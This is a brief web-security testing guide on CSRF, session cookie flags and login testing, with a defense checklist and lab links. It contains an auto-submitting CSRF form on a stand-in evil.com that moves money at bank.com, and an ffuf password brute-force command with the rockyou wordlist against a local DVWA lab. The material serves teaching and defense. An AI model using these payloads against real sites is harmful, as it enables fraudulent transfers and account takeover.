# CSRF, sessions, and authentication testing

Check every state-changing request for CSRF tokens. Check every auth flow for enumeration and rate limiting.

## CSRF — how it works

Victim is logged into `bank.com`. Victim visits `evil.com`. `evil.com` has a form that auto-submits to `bank.com/transfer`. Browser sends the victim's cookies. If no CSRF token: the transfer executes.

```html
<!-- CSRF attack page on evil.com -->
<form action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="amount" value="1000">
  <input type="hidden" name="to" value="attacker">
</form>
<script>document.forms[0].submit()</script>
```

## How to test for CSRF

1. Find any state-changing POST request in Burp (transfer, change email, change password)
2. Look at the request body — is there a `_token`, `csrf_token`, or `authenticity_token`?
3. If no token: likely vulnerable
4. If token present: remove it, replay in Repeater — does it still work?
5. If replay works without token: CSRF is present

## Session security checks

```bash
# Check cookie flags on login
curl -v http://localhost/login.php \
  -d "username=admin&password=password" 2>&1 | grep -i "set-cookie"

# Ideal response:
# Set-Cookie: PHPSESSID=abc; Path=/; HttpOnly; Secure; SameSite=Strict

# Check if session ID changes after login (session fixation test)
# 1. Get session ID before login
# 2. Log in
# 3. Check if session ID changed — it must, or session fixation is possible
```

## Authentication testing

```bash
# Username enumeration — different error messages reveal valid usernames
# "Invalid username" vs "Invalid password" = enumeration possible

# No rate limiting — test by sending many requests fast
# Using ffuf against DVWA (lab only)
ffuf -u http://localhost/login.php -X POST \
  -d "username=admin&password=FUZZ" \
  -w /usr/share/wordlists/rockyou.txt \
  -b "PHPSESSID=yoursession; security=low" \
  -H "Content-Type: application/x-www-form-urlencoded"

# Password reset — check if token in URL is predictable or reusable
```

## Defense checklist

- CSRF: CSRF token in every state-changing form, `SameSite=Strict` on session cookie
- Session: regenerate session ID on login, `HttpOnly` + `Secure` + `SameSite` flags
- Auth: same error message for bad username and bad password, rate limiting, MFA

## Practice

PortSwigger CSRF labs: https://portswigger.net/web-security/csrf
PortSwigger Authentication labs: https://portswigger.net/web-security/authentication
TryHackMe "Authentication Bypass": https://tryhackme.com/room/authenticationbypass
